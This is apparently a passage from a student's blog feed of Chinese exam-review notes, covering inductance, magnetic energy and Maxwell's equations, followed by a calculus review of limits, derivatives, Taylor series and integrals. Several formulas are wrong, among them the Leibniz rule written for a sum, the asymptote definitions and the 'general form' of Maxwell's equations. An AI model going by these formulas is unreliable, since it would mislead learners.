自感有使回路保持其原有电流不变的性质.有时又把自感系数称为“<strong>电磁惯性</strong>”.</p>
<h3 id="常用的自感系数公式">常用的自感系数公式</h3>
<p>​ <img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230514210509356.png" /></p>
<h3 id="互感">互感</h3>
<p>​
一个闭合的导体回路，当其中的电流随时间变化时，它周围的磁场也随时间变化，从而在<strong>邻近的另一个回路中</strong>产生感应电动势的现象，称为<strong>互感现象</strong>，所产生的电动势称为<strong>互感电动势</strong>.</p>
<p>​
<img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230514214609825.png" style="zoom:150%;" /></p>
<p>图中有两个固定的闭合回路<span
class="math inline">\(L_1\)</span>和<span
class="math inline">\(L_2\)</span>，回路<span
class="math inline">\(L_2\)</span>中的互感电动势是由回路<span
class="math inline">\(L_1\)</span>中的电流<span
class="math inline">\(I_1\)</span>随时间变化引起的，以<span
class="math inline">\(\epsilon_{21}\)</span>表示此电动势.由毕-萨定律可知，电流<span
class="math inline">\(I_1\)</span>产生的磁感应强度正比于<span
class="math inline">\(I_1\)</span>，因此，通过<span
class="math inline">\(L_2\)</span>所围面积的磁通量也应和<span
class="math inline">\(I_1\)</span>成正比，即 <span
class="math display">\[
\Psi_{m21}=M_{21}I_1
\]</span> ​ 比例系数<span
class="math inline">\(M_{21}\)</span>定义为回路<span
class="math inline">\(L_1\)</span>对回路<span
class="math inline">\(L_2\)</span>的互感系数，简称互感.</p>
<p>​
它的大小取决于两个回路的几何形状、相对位置、它们各自的匝数以及它们周围磁介质的分布情况.</p>
<p>​ 根据法拉第电磁感应定律，互感电动势为 <span class="math display">\[
\epsilon_{21}=-\frac{d\Phi_{m21}}{dt}=-M_{21}\frac{dI_1}{dt}
\]</span> ​ 对于给定的一对导体回路有 <span class="math display">\[
M_{21}=M_{12}=M
\]</span> ​ M称为这两个导体回路的互感系数，简称为互感，单位为亨利.</p>
<h3 id="常用的互感系数">常用的互感系数</h3>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230514215212510.png" /></p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230514215226494.png" /></p>
<p>​ 一般情况下， <span class="math display">\[
M=k\sqrt{L_1L_2},0\leq k\leq1
\]</span> ​ k称为耦合系数.当k等于1时，是理性的耦合情况.</p>
<h3 id="计算法-3">计算法</h3>
<p>​
对于自感系数的求解，关键是找出<strong>穿过通电线圈回路自身的磁通量</strong>，找到后根据自感定义便可求得自感系数；</p>
<p>​
对于互感系数的求解，可利用两回路互感系数相等的性质进行转化，尝试找出一个闭合回路中电流产生的磁感应强度穿过另一回路的磁通量，再根据互感定义求解.</p>
<h2 id="磁场能量">磁场能量</h2>
<p>​
<img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230514220224884.png" style="zoom:150%;" /></p>
<p>​
对于图示的简单电路，电源提供的能量一部分用于焦耳热，一部分用于克服自感电动势作功，线圈电流增长的过程，就是自感线圈中的磁场建立的过程.所以克服自感电动势作功所转换的能量就是线圈中电流激发的磁场能量.</p>
<p>​ 下面定量计算这一能量.</p>
<p>​ 设电路接通后回路中某瞬时的电流为I. <span class="math display">\[
\epsilon+\epsilon_L=IR
\]</span> ​ 自感电动势为 <span class="math display">\[
\epsilon_L=-L\frac{dI}{dt}
\]</span> ​ 因此 <span class="math display">\[
\epsilon=L\frac{dI}{dt}+IR
\]</span> ​ 将上式两边同时乘以<span
class="math inline">\(Idt\)</span>，有 <span class="math display">\[
\epsilon Idt=LIDI+I^2Rdt
\]</span> ​ 等式左边表示电源再<span
class="math inline">\(dt\)</span>时间内作的元功<span
class="math inline">\(\epsilon Idt\)</span>.按</p>
<p>​ 当电流达到稳定值I时，这部分能量用<span
class="math inline">\(W_m\)</span>表示为 <span class="math display">\[
W_m=\int _0 ^I LIdI=\frac{1}{2}LI^2
\]</span> ​ 上式对任意通有电流I的自感元件都是适用的.</p>
<h3 id="磁场能量密度">磁场能量密度</h3>
<p>​ 磁能是存储在磁场的，通过变换，我们能将磁能用磁场的物理量<span
class="math inline">\(B\)</span>和<span
class="math inline">\(H\)</span>描述.</p>
<blockquote>
<p><span class="math inline">\(H\)</span>是磁场强度，定义 <span
class="math display">\[
\mathbf H=\frac{\mathbf B}{\mu _0}
\]</span></p>
</blockquote>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230514221337215.png" /></p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230514221436202.png" /></p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230514221450942.png" /></p>
<h3 id="计算法-4">计算法</h3>
<p>​
求解磁场能量的普遍方法是<strong>利用磁场能量密度</strong>进行体积分.</p>
<p>​
当磁场具有球、柱等对称性时，一般体积元dV的选取方法是：在<strong>柱对称</strong>的情况下选薄柱层；在球对称的情况下选取<strong>薄球壳层</strong>.</p>
<h2 id="麦克斯韦电磁场理论">麦克斯韦电磁场理论</h2>
<h3 id="位移电流">位移电流</h3>
<p>​ 稳恒电流的磁场遵从安培环路定律，但是非稳恒电流产生的磁场不适用.</p>
<p>​
电容器充放电过程中，电容器极板间虽无传导电流，但却存在不断发生着变化的电场.</p>
<p>​ 根据电容器的性质： <span class="math display">\[
Q=CU=\frac{\varepsilon_0S}{d}Ed=\varepsilon_0ES=\varepsilon_0
\Phi_e=\varepsilon_e \iint_\limits S \mathbf E\cdot d\mathbf S
\]</span></p>
<p><span class="math display">\[
I_c=\frac{dQ}{dt}=\varepsilon_0\iint _\limits S \frac{\partial \mathbf
E}{\partial t}\cdot d \mathbf S
\]</span></p>
<p>​
若把最右端的电通量的时间变化率看作为一种电流，那么电路就连续了，麦克斯韦把这种电流称为位移电流.
<span class="math display">\[
I_D=\varepsilon_0 \iint _\limits S \frac{\partial \mathbf E}{\partial
t}\cdot d\mathbf S= \iint _\limits S \mathbf J_D\cdot d\mathbf S
\]</span> ​ 位移电流密度矢量 <span class="math display">\[
\mathbf J_D=\varepsilon _0\frac{\partial \mathbf E}{\partial t}
\]</span> ​</p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230514223646619.png" /></p>
<h3 id="全电流全电流定律">全电流&amp;全电流定律</h3>
<p>​ 全电流：通过<strong>某一截面</strong>的传导电流和位移电流的代数和
<span class="math display">\[
I_全=I_C+I_D
\]</span> ​ 全电流安培环路定理 <span class="math display">\[
\oint_L \mathbf B\cdot d\mathbf l=I_C+I_D=\iint _\limits S (\mathbf
J_C+\mathbf J_D)\cdot d\mathbf S    
\]</span>
麦克斯韦位移电流假说的实质是：位移电流可以在空间中激发磁场.</p>
<h3 id="麦克斯韦方程组">麦克斯韦方程组</h3>
<p>电磁波传播形式：</p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230514224613228.png" /></p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230514224817403.png" /></p>
<p>​ 麦克斯韦方程组的积分形式： <span class="math display">\[
\begin{cases}
\oint _S \mathbf E \cdot d \mathbf S=\frac{1}{\varepsilon_0}\int _V \rho
\cdot dV&amp;电场高斯定理\\
\oint _S \mathbf E \cdot d \mathbf l=-\int _S \frac{\partial \mathbf B
}{\partial t}\cdot d\mathbf S\space \space \space
&amp;电场安培环路定理\\
\oint_S \mathbf B \cdot d\mathbf S=0\space \space \space
&amp;磁场高斯定理\\
\oint _L \mathbf B \cdot d\mathbf l=\mu_0 \int _S \mathbf J \cdot d
\mathbf S+\mu_0\varepsilon_0
\int_S \frac{\partial \mathbf E}{\partial t}\cdot d\mathbf S
&amp;磁场安培环路定理
\end{cases}
\]</span> ​ 物理意义</p>
<ol type="1">
<li>通过任意闭合面的<strong>电位移通量</strong>等于该曲面包围的<strong>自由电荷的代数和</strong>.</li>
<li><strong>电场强度</strong>沿任意<strong>闭曲线</strong>的线积分等于以该曲线为边界的任意曲面的<strong>磁通量对时间变化量</strong>的负值.</li>
<li>通过任意闭合面的磁通量恒等于零.</li>
<li>稳恒磁场沿任意闭合曲线的线积分等于穿过以该曲线为边界的曲面的<strong>全电流</strong>.</li>
</ol>
<p>​ 涡旋电场和位移电流假说</p>
<p>​ 变化的磁场可以激发涡流电场。</p>
<p>​ 变化的电场可以激发涡旋磁场。</p>
<p>​ 麦克斯韦方程的一般形式： <span class="math display">\[
\begin{cases}
\oint _S \mathbf D \times d\mathbf S=\sum\limits_{S内}q_{0i}
&amp;静电场的高斯定理\\
\oint_L \mathbf E \cdot d \mathbf l=0 &amp;静电场的环路定理\\
\oint _S \mathbf B\cdot d\mathbf S=0 &amp;稳恒磁场的高斯定理\\
\oint _L \mathbf H\cdot d \mathbf l=\sum_\limits {L内}I
&amp;稳恒磁场的安倍环路定理\\
\end{cases}
\]</span></p>
]]></content>
      <tags>
        <tag>Review</tag>
        <tag>Physics</tag>
      </tags>
  </entry>
  <entry>
    <title>数分复习</title>
    <url>/archives/705520af.html</url>
    <content><![CDATA[<p>​ 临考前发的post，已经山穷水尽咧！</p>
<p>​ 希望考试能有个好结果 <span id="more"></span> # 求极限</p>
<h2 id="思路">思路</h2>
<h3 id="先化简">先化简</h3>
<p>四则运算：能不能拆，能不能先算</p>
<h3 id="加减法时">加减法时：</h3>
<ul>
<li><span
class="math inline">\(e^{f(x)}-e^{g(x)}=e^{g(x)}\cdot(e^{f(x-g(x)}-1)\sim
e^{g(x)}\cdot [f(x)-g(x)]\)</span></li>
<li><span
class="math inline">\(f^\alpha(x)-g^\alpha(x)=g^\alpha(x)\cdot[(\frac{f(x)}{g(x)})^\alpha-1]=g^\alpha(x)\cdot[(1+(\frac{f(x)}{g(x)}-1))^\alpha-1]\)</span></li>
<li><span class="math inline">\(\ln A-B=\ln A -\ln e^B=\ln
\frac{A}{e^B}\)</span></li>
<li>$,f(x),g(x) $令t=1/x，通分</li>
<li>泰勒公式</li>
</ul>
<h2 id="恒等变形">恒等变形</h2>
<p>​ 幂指函数<span
class="math inline">\(u^{v(x)}(x)\)</span>不能等价，只能变形</p>
<ul>
<li>1<sup>[]</sup>：公式:<span class="math inline">\(\lim f(x)^{g(x)}\to
e^{\lim [f(x)-1]\cdot g(x)}\)</span></li>
<li>其他：<span class="math inline">\(e^{u(x)\ln
v(x)}\)</span>得到新极限再化简</li>
</ul>
<h2 id="等价无穷小加减法别用">等价无穷小(加减法别用)</h2>
<p>常用的： <span class="math display">\[
\begin{split}
\sin x\sim \tan x &amp;\sim \arctan x\sim\arcsin x\sim x\\
\ln (x+1)&amp;\sim x\\
e^x-1 &amp;\sim x\\
\cos x &amp;\sim 1-\frac{1}{2}x^2\\
\sqrt[n]{1+x}-1 &amp;\sim \frac{1}{n}x
\end{split}
\]</span> 不算常用： <span class="math display">\[
\begin{split}
ln(1+\sqrt{x})&amp;\sim x^{\frac{1}{2}}\\
e^{x^{2}}-1&amp;\sim x^{2}\\
x-sinx &amp;\sim \frac{1}{6}x^{3}\\
\sqrt[3]{x}&amp;\sim x^{1/2}\\
e^{sinx}-1 &amp;\sim x
\end{split}
\]</span></p>
<p>​ 抓大头</p>
<p>​<br />
<span class="math display">\[
x \to \infty :x^3+x^2+x \sim x^3
\]</span></p>
<p><span class="math display">\[
x \to 0:x^3+x^2+x \sim x
\]</span></p>
<p><span class="math display">\[
无穷大+有界 \sim 无穷大 ：x\to\infty :x+sinx \sim x
\]</span></p>
<h2 id="变换指数">变换指数</h2>
<p><span class="math display">\[
\lim_{x \to x_0}u(x)^{v(x)}=\lim_{x \to x_0}e^{v(x)\ln u(x)}
\]</span></p>
<h2 id="求渐近线">求渐近线</h2>
<p>​
定义设有直线L:y=ax+b,曲线C:y=f(x),如果点(x,y)沿着曲线y=f(x)趋于∞时，(x,y)到L的距离d趋于0，则称y=ax+b是曲线y=f(x)的渐近线。</p>
<p>​ From the definition: <span class="math display">\[
\lim_{n \to \infty}\frac{|f(x)-(ax+b)|}{\sqrt{1+a^2}}=b
\]</span></p>
<p><span class="math display">\[
\lim_{n \to \infty}\frac{f(x)-ax}{x}=0
\]</span></p>
<p><span class="math display">\[
\lim_{n \to \infty}\frac{f(x)}{x}=a
\]</span></p>
<p>​ 得到a后再回代求出b即可</p>
<p>​ 垂直渐近线：<span class="math inline">\(\lim_{n \to
\infty}\frac{f(x)}{x}=a\)</span>,则称x=x<sub>0</sub>是y=f(x)的垂直渐近线。</p>
<p>​ 水平渐近线：<span class="math inline">\(\lim_{n \to
\infty}f(x)=\infty\)</span>，则称y=a是y=f(x)的水平渐近线。</p>
<h1 id="连续">连续</h1>
<p>​ f在x<sub>0</sub>处连续的3个条件：</p>
<ul>
<li>f在x<sub>0</sub>处有定义</li>
<li><span class="math inline">\(\lim_{x \to
x_0}f(x)\)</span>存在，即<span class="math inline">\(\lim_{x \to
x_0}f(x_0-0)=\lim_{x \to x_0}f(x_0+0)\)</span>均存在且相等</li>
<li><span class="math inline">\(\lim_{x \to
x_0}f(x)=f(x_0)\)</span></li>
</ul>
<p>​ 第一类间断点和第二类间断点的区分是：<span
class="math display">\[f(x_0^-)和f(x_0^+)\]</span>是否都存在</p>
<h1 id="求导">求导</h1>
<h2 id="对数求导法">对数求导法</h2>
<p>​ 两边取对数再求导</p>
<h2 id="高阶导数">高阶导数</h2>
<p><span class="math display">\[
\begin{split}
(\ln(1+x))^{(n)}&amp;=(-1)^{n-1}\frac{(n-1)!}{(1+x)^n}\\
(\sin x)^{(n)}&amp;=\sin (x+n\times \frac {\pi}{2})\\
(\cos x)^{(n)}&amp;=\cos (x+n\times \frac {\pi}{2})\\
(a^x)^{(n)}&amp;=a^x \times \ln^na\\
(x^a)^{(n)}&amp;=a(a-1)\cdots(a-n+1) x^{a-n}\\
(\sin kx)^{(n)}&amp;=k^n\sin (kx+n\times \frac {\pi}{2})\\
(\cos kx)^{(n)}&amp;=k^n\cos (kx+n\times \frac {\pi}{2})\\
\end{split}
\]</span></p>
<p>​ 莱布尼兹（Leibniz）公式： <span class="math display">\[
(u+v)^{(n)}=\sum_{k=0}^{n}C_n^ku^{(n-k)}v^{(k)}
\]</span></p>
<h3 id="求高阶导数">求高阶导数</h3>
<ol type="1">
<li><p>归纳法</p>
<p>慢慢算，找规律</p></li>
<li><p>莱布尼兹公式</p>
<p>例如：<span
class="math inline">\(y=x^2e^{2x}\)</span>，求y<sup>(20)</sup> <span
class="math display">\[
\begin{split}
y^{20}&amp;=C^0_{20}x^2\cdot(e^{2x})^{(20)}+C_{20}^{1}2x\cdot(e^{2x})^{(19)}+C_{20}^2
2\cdot (e^{2x})^{(18)}\\
&amp;=x^2\cdot2^{20}e^{2x}+20\cdot2x\cdot2^{19}e^{2x}+\frac{19\times
18}{2}\cdot2\cdot2^{18}e^{2x}
\end{split}
\]</span></p></li>
<li><p>泰勒展开</p>
<p>例如<span
class="math inline">\(f(x)=e^{x^3}\)</span>求f(0)<sup>(99)</sup> <span
class="math display">\[
e^x=1+x+\frac{x^2}{2!}+\cdots+\frac{x^n}{n!}
\]</span></p>
<p><span class="math display">\[
e^x=1+x^3+\frac{x^6}{2!}+\cdots+\frac{x^{3n}}{n!}
\]</span></p>
<p><span class="math display">\[
f^{(99)}(0)=\frac{99!}{33!}
\]</span></p></li>
</ol>
<h1 id="微分">微分</h1>
<p>​
定义：设函数y=f(x)在某区间内有定义，x<sub>0</sub>及x<sub>0</sub>+Δx在这区间内，如果函数的增量
<span class="math display">\[
\Delta y=f(x_0+\Delta x)-f(x_0)
\]</span> ​ 可表示为 <span class="math display">\[
\Delta y=A\Delta x+o(\Delta x)
\]</span> ​
其中A是<strong>不依赖于Δx的常数</strong>，那么称函数y=f(x)在点x<sub>0</sub>是<strong>可微</strong>的，而AΔx叫做函数y=f(x)在点x<sub>0</sub>相应于自变量增量Δx的微分，记作<strong>dy</strong>，即
<span class="math display">\[
dy=A\Delta x
\]</span> ​
函数f(x)在点x<sub>0</sub>可微的充要条件是<strong>函数f(x)在点x<sub>0</sub>可导</strong>，且当f(x)在点x<sub>0</sub>可微时，其微分一定为：
<span class="math display">\[
dy=f&#39;(x_0)\Delta x
\]</span> ​ 当<span class="math inline">\(f&#39;(x_0)\neq0\)</span>时，有
<span class="math display">\[
\lim_{\Delta x \to 0}\frac{\Delta y}{dy}=\lim_{\Delta x \to
0}\frac{\Delta y}{f&#39;(x_0)\Delta x}=\frac{1}{f&#39;(x_0)}\lim_{\Delta
x \to 0}\frac{\Delta y}{\Delta x}=1
\]</span> ​ 从而，当<span class="math inline">\(\Delta x\to 0\)</span>时
，<span class="math inline">\(\Delta y\)</span>与dy是等价无穷小 <span
class="math display">\[
\Delta y=dy+o(dy)
\]</span> ​ 即dy是Δy的主部。</p>
<p>​ 当<span
class="math inline">\(f&#39;(x_0)\neq0\)</span>的条件下时，我们说dy是Δy的<strong>线性主部</strong></p>
<p>​ 在<span
class="math inline">\(f&#39;(x_0)\neq0\)</span>的条件下，以微分<span
class="math inline">\(dy=f&#39;(x_0)\Delta x\)</span>近似代替增量<span
class="math inline">\(\Delta y=f(x_0+\Delta
x)-f(x_0)\)</span>时，误差为o(dy)</p>
<p>​ 因此当|Δx|很小时，有近似等式：<span class="math inline">\(\Delta
y\approx dy\)</span></p>
<p>​
函数y=f(x)在任意点x的微分，称为<strong>函数的微分</strong>，记作dy或df(x)，即
<span class="math display">\[
dy=f&#39;(x)\Delta x
\]</span> ​
通常把自变量x的增量Δx称为<strong>自变量的微分</strong>，记作dx，即dx=Δx，于是函数的微分又记作：
<span class="math display">\[
dy=f&#39;(x)dx
\]</span></p>
<h2 id="近似计算不考">近似计算（不考）</h2>
<p>​ 当|Δx|很小的时候，基于式子： <span class="math display">\[
\Delta y\approx dy =f&#39;(x_0)\Delta x
\]</span> ​ 这个式子也可以写成 <span class="math display">\[
\Delta y =f&#39;(x_0+\Delta x)-f(x_0) \approx f&#39;(x_0)\Delta x
\]</span> ​ 或: <span class="math display">\[
f(x_0+\Delta x)\approx f(x_0)+f&#39;(x_0)\Delta x
\]</span> ​ 在上式中令x=x<sub>0</sub>+Δx，即Δx=x-x<sub>0</sub>: <span
class="math display">\[
f(x) \approx f(x_0)+f&#39;(x-x_0)\Delta x
\]</span> ​ 近似计算的本质就是用x的线性函数<span
class="math inline">\(f(x) \approx f(x_0)+f&#39;(x-x_0)\Delta
x\)</span>来近似表达函数f(x)</p>
<h2 id="微分中值定理">微分中值定理</h2>
<h3 id="罗尔定理">罗尔定理</h3>
<p>​
费马引理：设函数f(x)在点x<sub>0</sub>的某领域U(x<sub>0</sub>)内有定义，并且在x<sub>0</sub>处可导，如果对任意的<span
class="math inline">\(x\in U(x_0)\)</span>，有 <span
class="math display">\[
f(x)\leqslant f(x_0)或(f(x)\geqslant f(x_0))
\]</span> ​ 那么<strong>f'(x<sub>0</sub>)=0</strong></p>
<p>​
通常称<strong>导数为零</strong>的点为函数的驻点（临界点、稳定点）</p>
<p>​ 罗尔定理：</p>
<p>​ 如果函数f(x)满足</p>
<ul>
<li>在闭区间[a,b]上连续</li>
<li>在开区间(a,b)内可导</li>
<li>在区间端点处的函数值相等，即f(a)=f(b)</li>
</ul>
<p>​
那么，在(a,b)内<strong>至少</strong>有一点ξ(a&lt;ξ&lt;b)，使得<strong>f'(ξ)=0</strong></p>
<h3 id="拉格朗日中值定理">拉格朗日中值定理</h3>
<p>​ 如果函数f(x)满足：</p>
<ul>
<li>在闭区间[a,b]上连续</li>
<li>在开区间(a,b)内可导</li>
</ul>
<p>​ 那么在(a,b)内至少有一点ξ(a&lt;ξ&lt;b)，使得等式 <span
class="math display">\[
f(b)-f(a)=f&#39;(\xi)(b-a)
\]</span> ​ 成立。</p>
<p>​
几何意义：如果连续曲线y=f(x)的弧AB上除端点外处处具有不垂直于x轴的切线，那么这弧上至少有一点C，使得曲线在点C的切线平行于弦AB。</p>
<p>​ 罗尔定理是拉格朗日中值定理f(a)=f(b)的特殊情况。 <span
class="math display">\[
f(x+\Delta x)-f(x)=f&#39;(x+\theta \Delta x) \cdot \Delta
x(0&lt;\theta&lt;1)
\]</span> ​ 如果记f(x)为y，那么： <span class="math display">\[
\Delta y=f&#39;(x+\theta \Delta x) \cdot \Delta x(0&lt;\theta&lt;1)
\]</span> ​ 有限增量定理，上式称为<strong>有限增量公式</strong>。</p>
<p>​
定理：如果函数f(x)在区间I上连续，I内可导且导数恒为0，那么f(x)在区间I上是一个常数。</p>
<h3 id="柯西中值定理">柯西中值定理</h3>
<p>​ 如果函数f(x)及F(x)满足</p>
<ul>
<li>在闭区间[a,b]上连续</li>
<li>在开区间(a,b)内可导</li>
<li>对任意<span
class="math inline">\(x\in(a,b),F&#39;(x)\neq0\)</span></li>
</ul>
<p>​ 那么在(a,b)内至少有一点ξ，使等式： <span class="math display">\[
\frac{f(b)-f(a)}{F(B)-F(A)}=\frac{f&#39;(\xi)}{F&#39;(\xi)}
\]</span></p>
<h2 id="泰勒公式">泰勒公式</h2>
<h3 id="泰勒中值定理">泰勒中值定理</h3>
<p>​
如果函数f(x)在x<sub>0</sub>处具有n阶导数，那么存在x<sub>0</sub>的一个邻域，对于该邻域的任一x，有：
<span class="math display">\[
f(x)=f(x_0)+f&#39;(x_0)(x-x_0)+\frac{f&#39;&#39;(x)}{2!}(x-x_0)^2+\cdots+\frac{f^{(n)}(x_0)}{n!}(x-x_0)^n+R_n
\]</span> ​ 其中： <span class="math display">\[
R_n(x)=o((x-x_0)^n)
\]</span> ​ 上述二式为<strong>带皮亚诺余项的泰勒公式</strong></p>
<p>​ 带拉格朗日余项的泰勒公式：</p>
<p>​
如果函数f(x)在x<sub>0</sub>的某个邻域U(x<sub>0</sub>)内具有(n+1)阶导数，那么对于任一x属于U(x<sub>0</sub>)，有
<span class="math display">\[
f(x)=f(x_0)+f&#39;(x_0)(x-x_0)+\frac{f&#39;&#39;(x)}{2!}(x-x_0)^2+\cdots+\frac{f^{(n)}(x_0)}{n!}(x-x_0)^n+R_n(x)
\]</span></p>
<p><span class="math display">\[
R_n(x)=\frac{f^{(n+1)}(\xi)}{(n+1)!}(x-x_0)^{n+1}
\]</span></p>
<p>​ 这里ξ是x<sub>0</sub>和x之间的某个值。</p>
<p>​
当n=0时，泰勒公式变成拉格朗日中值定理，可见，泰勒中值定理是拉格朗日中值定理的推广。</p>
<p>​
在带皮亚诺余项的泰勒公式中，如果取x<sub>0</sub>=0，那么带有佩亚诺余项的麦克劳林展开式：
<span class="math display">\[
f(x)=f(0)+f&#39;(x_0)(0)+\frac{f&#39;&#39;(x)}{2!}(0)+\cdots+\frac{f^{(n)}(x_0)}{n!}(0)+o(x^n)
\]</span> ​
在带拉格朗日余项的泰勒公式中，可以令ξ=θx(0&lt;θ&lt;1)，从而使得泰勒公式简化为：
<span class="math display">\[
f(x)=f(x_0)+f&#39;(x_0)(x-x_0)+\frac{f&#39;&#39;(x)}{2!}(x-x_0)^2+\cdots+\frac{f^{(n)}(x_0)}{n!}(x-x_0)^n+\frac{f^{(n+1)}(\theta
x)}{(n+1)!}x^{n+1}
\]</span> ​ 可得到近似公式： <span class="math display">\[
f(x)=f(0)+f&#39;(x_0)(0)+\frac{f&#39;&#39;(x)}{2!}(0)+\cdots+\frac{f^{(n)}(x_0)}{n!}(0)
\]</span> ​ 误差估计式变为： <span class="math display">\[
|R_n(x)|\leqslant\frac{M}{(n+1)!}|x|^{n+1}
\]</span> ​ 常用的麦克劳林公式： <span class="math display">\[
\begin{split}
e^x&amp;=1+x+\frac{x^2}{2!}+\frac{x^3}{3!}+\cdots+\frac{x^n}{n!}+o(x^n)\\
sinx&amp;=x-\frac{x^3}{3!}+\frac{x^5}{5!}+\cdots+(-1)^{n}\frac{x^{2n+1}}{(2n+1)!}+o(x^{2n+1})(n=0,1,2,\cdots)\\
cosx&amp;=1-\frac{x^2}{2!}+\frac{x^4}{4!}+\cdots+(-1)^{n}\frac{x^{2n}}{(2n)!}+o(x^2n)(n=0,1,2,\cdots)\\
\tan x&amp;=x+\frac{1}{3}x^3+\frac{2}{15}x^5+\frac{17}{315}x^7+\cdots\\
(1+x)^\alpha &amp;=1+\alpha x+\frac{\alpha
(\alpha-1)}{2!}x^2+\frac{\alpha  (\alpha-1)(\alpha
-2)}{3!}x^3+\cdots+\frac{\alpha (\alpha-1)(\alpha -2)\cdots(\alpha
-n+1)}{n!}x^n+o(x^n)\\
\frac{1}{1+x}&amp;=1-x+x^2-x^3+\cdots+(-1)^nx^n+o(x^n)(n=0,1,2,\cdots)\\
ln(1+x)&amp;=x-\frac{x^2}{2}+\frac{x^3}{3}+\cdots+(-1)^n\frac{x^{n+1}}{n+1}+o(x^{n+1})(n=0,1,\cdots)
\end{split}
\]</span> <strong>cos
x</strong>的麦克劳林公式可由<strong>sinx</strong>的公式求导得到。</p>
<p><strong>ln(1+x)</strong>的麦克劳林公式可由<span
class="math inline">\(\frac{1}{1+x}\)</span>的公式积分得到。</p>
<p>什么时候使用？</p>
<ul>
<li>五函数作加减法(<span class="math inline">\(e^x,\sin x,\cos x,\ln
x,(1+x)^\alpha\)</span>)</li>
<li><span class="math inline">\(x^k\)</span>与五函数作乘法</li>
<li><span
class="math inline">\(x^k\)</span>与五函数作复合运算。例如<span
class="math inline">\(e^{x^2}=1+x^2+\frac{x^4}{2!}+\cdots\)</span></li>
</ul>
<p>怎么用：</p>
<ul>
<li>f(x)-g(x)：展开到首次出现非零项</li>
<li><span
class="math inline">\(\frac{f(x)}{x^k}\)</span>：展开到k阶，上下同阶</li>
</ul>
<h2 id="曲线的凹凸性">曲线的凹凸性</h2>
<p>​
定义：设f(x)在区间I上连续，如果对I上任意两点x<sub>1</sub>和x<sub>2</sub>恒有：
<span class="math display">\[
f(\frac{x_1+x_2}{2})&lt;\frac{f(x_1)+f(x_2)}{2}
\]</span> ​ 那么称f(x)在I上的图像是（向）上凹的；</p>
<p>​ 如果： <span class="math display">\[
f(\frac{x_1+x_2}{2})&gt;\frac{f(x_1)+f(x_2)}{2}
\]</span> ​ 那么称f(x)在I上的图像是向（上）凸的；</p>
<p>​ 凹凸判定：</p>
<p>​ 设f(x)在[a,b]上连续，在(a,b)内具有一阶和二阶导数，那么</p>
<ul>
<li>若在(a,b)内f''(x)&gt;0，则f(x)在[a,b]上的图像是凹的；</li>
<li>若在(a,b)内f''(x)&lt;0，则f(x)在[a,b]上的图像是凸的；</li>
</ul>
<p>一般地，设y=f(x)在区间I上连续，x<sub>0</sub>是I内的点.如果曲线y=f(x)在经过点(x<sub>0</sub>,f(x<sub>0</sub>))时，曲线的凹凸性改变了，那么就称点(x<sub>0</sub>,f(x<sub>0</sub>))为这曲线的<strong>拐点</strong>。</p>
<h1 id="不定积分">不定积分</h1>
<p>​ 连续函数一定有原函数.</p>
<h2 id="换元法求不定积分">换元法求不定积分</h2>
<p>​ 一般地，对于积分<span class="math inline">\(\int
f(ax+b)dx,(a\neq0)\)</span> 总可以作变换u=ax+b，把它变成 <span
class="math display">\[
\int f(ax+b)dx=\int \frac{1}{a}f(ax+b)d(ax+b)=\frac{1}{a}[\int
f(u)du]_{u=ax+b}
\]</span> ​ 一般地，对于<span class="math inline">\(\sin
^{2k+1}\cos^nx\)</span>或<span
class="math inline">\(\sin^nx\cos^{2k+1}x\)</span>其中(<span
class="math inline">\(k\in
N\)</span>)型函数的积分，总可以依次作变换u=cosx或u=sinx,求得结果</p>
<p>​ 一般地，对于<span class="math inline">\(\sin
^{2k}x\cos^{2l}x,(k,l\in N)\)</span>型函数，总可以利用三角恒等式：<span
class="math inline">\(sin^2x=\frac{1}{2}(1-\cos2x),cos^2=\frac{1}{2}(1+cos2x)\)</span>化成cos2x的多项式，然后再求积分。</p>
<p>​ 一般地，对于<span
class="math inline">\(tan^nxsec^{2k}x\)</span>或<span
class="math inline">\(tan^{2k-1}xsec^nx(n,k\in
N_*)\)</span>型函数，可依次作变换u=tanx或u=secx求得结果</p>
<h2 id="常用积分">常用积分</h2>
<p><span class="math display">\[
\int \frac{dx}{\sqrt{a^2+x^2}}=\ln({x+\sqrt{x^2+a^2}})+C
\]</span></p>
<h1 id="定积分">定积分</h1>
<p>​ f(x)在区间[a,b]可积的条件</p>
<ul>
<li>f(x)在[a,b]上连续</li>
<li>f(x)在[a,b]上有有限个间断点，且函数有上界</li>
</ul>
<h2 id="定积分计算思路">定积分计算思路</h2>
<h3 id="先简化">先简化</h3>
<ol type="1">
<li><p>几何意义：<span class="math inline">\(\int_a^b
\sqrt{px^2+qx+v}\space dx(p&lt;0)\)</span>:积分曲线是圆</p></li>
<li><p>对称性： <span class="math display">\[
\int_{-a}^af(x)dx=\cases{0,当f(x为奇函数)\\2\int _0^a.当f(x)为偶函数}
\]</span></p></li>
<li><p>周期性：</p>
<p>f(x)以T为周期可积： <span class="math display">\[
\int_a^{a+T}f(x)dx=\int _0 ^Tf(x)dx=\int^{\frac{T}{2}}_{-\frac{T}{2}}dx
\tag{1}
\]</span></p>
<p><span class="math display">\[
\int_a^{a+T}f(x)dx=\int _0 ^{nT}f(x)dx=n\int^{T}_{0}dx \tag{2}
\]</span></p></li>
<li><p>常用公式</p>
<p>f(x)连续: <span class="math display">\[
\int^{\frac{\pi}{2}}_{0}f(x)dx=\int^{\frac{\pi}{2}}_0f(\cos
x)dx(令x=\frac{\pi}{2}-t即可证明)
\]</span></p>
<p><span class="math display">\[
\int_0^{\pi}xf(sinx)dx=\frac{\pi}{2}\int _0 ^{\pi}f(sinx)dx(令x=\pi
-t即可证明)
\]</span></p>
<p><span class="math display">\[
